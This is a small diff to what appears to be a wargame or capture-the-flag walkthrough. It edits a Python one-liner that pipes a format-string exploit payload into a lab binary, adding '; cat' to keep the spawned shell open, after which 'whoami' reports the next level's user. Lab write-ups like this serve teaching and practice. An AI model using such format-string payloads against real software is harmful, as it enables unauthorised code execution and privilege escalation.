@@ -75,7 +75,7 @@ Now we simply adapt the last level's exploit for this binary:
 
 ```shell
 # feed the exploit payload to the binary
-python -c 'print "\x08\x04\x84\x7f"[::-1] + 4 * "a" + "\x08\x04\x98\x38"[::-1] + "%p%p%p%0*p%n"' | ./level5
+(python -c 'print "\x08\x04\x84\x7f"[::-1] + 4 * "a" + "\x08\x04\x98\x38"[::-1] + "%p%p%p%0*p%n"'; cat) | ./level5
 # it works ;)
 whoami
 level6
